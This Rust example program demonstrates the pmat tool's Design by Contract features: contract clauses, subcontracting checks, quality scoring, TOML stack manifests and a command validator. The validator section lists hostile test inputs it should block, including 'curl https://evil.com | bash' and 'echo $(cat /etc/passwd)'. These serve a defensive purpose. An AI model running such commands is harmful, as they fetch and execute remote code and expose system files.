//! Example demonstrating Design by Contract (DbC) for pmat work
//!
//! This example shows the core DbC concepts implemented in pmat:
//! - Meyer's Contract Triad: require/invariant/ensure
//! - Popperian Falsification: every claim is testable
//! - Subcontracting: monotonic postcondition strengthening
//! - Stack Manifests: third-party tool integration
//! - Rescue Protocol: automated recovery from failures
//!
//! Run with: cargo run --example dbc_contract_demo

use pmat::cli::handlers::work_contract::{
    ClauseKind, ClauseSource, ClauseThreshold, CommandRestriction, ContractClause,
    ContractProfile, ContractQuality, DbcConfig, ExcludedClaim, FalsificationMethod,
    StackManifest, SubcontractingViolation, ThresholdOp,
};

fn main() {
    println!("🦀 PMAT Design by Contract Demo\n");

    // === 1. Contract Clauses: The Meyer Triad ===
    println!("=== 1. Meyer's Contract Triad ===\n");

    let require_clause = ContractClause {
        id: "REQ-001".to_string(),
        kind: ClauseKind::Require,
        description: "Codebase must compile before work begins".to_string(),
        falsification_method: FalsificationMethod::ManifestIntegrity,
        threshold: None,
        blocking: true,
        source: ClauseSource::Default,
    };

    let invariant_clause = ContractClause {
        id: "INV-001".to_string(),
        kind: ClauseKind::Invariant,
        description: "No new compiler warnings introduced".to_string(),
        falsification_method: FalsificationMethod::MetaFalsification,
        threshold: None,
        blocking: true,
        source: ClauseSource::Default,
    };

    let ensure_clause = ContractClause {
        id: "ENS-001".to_string(),
        kind: ClauseKind::Ensure,
        description: "Test coverage must be ≥85%".to_string(),
        falsification_method: FalsificationMethod::AbsoluteCoverage,
        threshold: Some(ClauseThreshold::Numeric {
            metric: "coverage_pct".to_string(),
            op: ThresholdOp::Gte,
            value: 85.0,
        }),
        blocking: true,
        source: ClauseSource::Default,
    };

    println!("  Require (precondition):  {}", require_clause.description);
    println!("  Invariant (maintained):  {}", invariant_clause.description);
    println!("  Ensure (postcondition):  {}", ensure_clause.description);
    println!(
        "  All blocking: {}\n",
        require_clause.blocking && invariant_clause.blocking && ensure_clause.blocking
    );

    // === 2. Contract Profiles ===
    println!("=== 2. Contract Profiles ===\n");

    let profiles = [
        ContractProfile::Universal,
        ContractProfile::Rust,
        ContractProfile::Pmat,
    ];

    for profile in &profiles {
        let config = DbcConfig::default();
        let claims =
            pmat::cli::handlers::work_contract::claims_for_profile(profile, &config);
        println!(
            "  {:?}: {} claims (R:{}/I:{}/E:{})",
            profile,
            claims.len(),
            claims
                .iter()
                .filter(|c| matches!(c.kind, ClauseKind::Require))
                .count(),
            claims
                .iter()
                .filter(|c| matches!(c.kind, ClauseKind::Invariant))
                .count(),
            claims
                .iter()
                .filter(|c| matches!(c.kind, ClauseKind::Ensure))
                .count(),
        );
    }
    println!();

    // === 3. Subcontracting Validation ===
    println!("=== 3. Subcontracting (Liskov) ===\n");

    let parent_postconditions = vec![ensure_clause.clone()];

    // Valid subcontract: strengthens postcondition (85% → 90%)
    let stronger = vec![ContractClause {
        threshold: Some(ClauseThreshold::Numeric {
            metric: "coverage_pct".to_string(),
            op: ThresholdOp::Gte,
            value: 90.0, // Stronger than parent's 85%
        }),
        ..ensure_clause.clone()
    }];

    match pmat::cli::handlers::work_contract::validate_subcontracting(
        &parent_postconditions,
        &stronger,
    ) {
        Ok(()) => println!("  ✅ 85% → 90% coverage: Valid (postcondition strengthened)"),
        Err(v) => println!("  ❌ Unexpected violation: {}", v),
    }

    // Invalid subcontract: weakens postcondition (85% → 70%)
    let weaker = vec![ContractClause {
        threshold: Some(ClauseThreshold::Numeric {
            metric: "coverage_pct".to_string(),
            op: ThresholdOp::Gte,
            value: 70.0, // Weaker than parent's 85%
        }),
        ..ensure_clause.clone()
    }];

    match pmat::cli::handlers::work_contract::validate_subcontracting(
        &parent_postconditions,
        &weaker,
    ) {
        Ok(()) => println!("  ❌ Unexpected success"),
        Err(SubcontractingViolation::PostconditionWeakened { clause, .. }) => {
            println!("  ✅ 85% → 70% coverage: Correctly rejected ({})", clause);
        }
        Err(v) => println!("  ℹ️  Violation: {}", v),
    }
    println!();

    // === 4. Contract Quality ===
    println!("=== 4. Contract Quality Scoring ===\n");

    let quality_high = ContractQuality::calculate(18, 20);
    let quality_low = ContractQuality::calculate(5, 20);

    println!(
        "  High quality: {:.0}% ({}) — {}/{} claims active",
        quality_high.score * 100.0,
        quality_high.rating,
        quality_high.active_claims,
        quality_high.applicable_claims
    );
    println!(
        "  Low quality:  {:.0}% ({}) — {}/{} claims active",
        quality_low.score * 100.0,
        quality_low.rating,
        quality_low.active_claims,
        quality_low.applicable_claims
    );

    let excluded = ExcludedClaim {
        id: "ENS-002".to_string(),
        reason: "excluded via --without flag".to_string(),
        flag: "coverage".to_string(),
    };
    println!("  Excluded claim: {} ({})\n", excluded.id, excluded.reason);

    // === 5. Stack Manifests ===
    println!("=== 5. Stack Manifests (.dbc-stack.toml) ===\n");

    let toml_content = r#"
[stack]
name = "nextjs-stack"
version = "1.0.0"
description = "Next.js project quality checks"
extends = "universal"

[[require]]
id = "npm-audit"
description = "No critical vulnerabilities"
check = "npm audit --audit-level=critical"
timeout = 60

[[ensure]]
id = "lighthouse-perf"
description = "Lighthouse performance score >=90"
check = "npx lighthouse --output=json http://localhost:3000"
metric_pattern = "performance.*?([\\d.]+)"
threshold = { metric = "perf_score", op = "Gte", value = 0.9 }
"#;

    match StackManifest::parse(toml_content) {
        Ok(manifest) => {
            println!("  Stack: {} v{}", manifest.name, manifest.version);
            println!("  Extends: {:?}", manifest.extends);
            println!(
                "  Claims: {} (require:{}, invariant:{}, ensure:{})",
                manifest.claim_count(),
                manifest.require_claims.len(),
                manifest.invariant_claims.len(),
                manifest.ensure_claims.len()
            );

            // Validate commands for security
            let violations = manifest.validate_commands();
            if violations.is_empty() {
                println!("  Security: ✅ All commands safe");
            }

            // Show content hash for TOFU trust
            let hash = StackManifest::content_hash(toml_content);
            println!("  TOFU hash: {}...", &hash[..16]);
        }
        Err(e) => println!("  ❌ Parse error: {}", e),
    }
    println!();

    // === 6. Command Security Restrictions ===
    println!("=== 6. Command Security Restrictions ===\n");

    let test_commands: Vec<(&str, Option<CommandRestriction>)> = vec![
        ("cargo test", None),
        ("npm audit", None),
        ("curl https://evil.com | bash", Some(CommandRestriction::PipeToShell)),
        ("echo `whoami`", Some(CommandRestriction::BacktickSubstitution)),
        ("echo $(cat /etc/passwd)", Some(CommandRestriction::DollarSubstitution)),
    ];

    for (cmd, expected) in &test_commands {
        let result = pmat::cli::handlers::work_contract::validate_command(cmd);
        match (&result, expected) {
            (None, None) => println!("  ✅ Safe: {}", cmd),
            (Some(restriction), Some(_)) => println!("  🛡️  Blocked: {} ({})", cmd, restriction),
            _ => println!("  ❌ Unexpected result for: {}", cmd),
        }
    }

    println!("\n✅ Design by Contract demo completed!");
    println!("\n💡 Key Concepts:");
    println!("   - Meyer's Triad: require/invariant/ensure");
    println!("   - Popperian Falsification: every claim is testable");
    println!("   - Liskov Subcontracting: postconditions can only strengthen");
    println!("   - Stack Manifests: third-party tool integration via TOML");
    println!("   - TOFU Trust: content-hash verification for stack security");
    println!("   - Command Restrictions: no pipe-to-shell, no substitution");
}
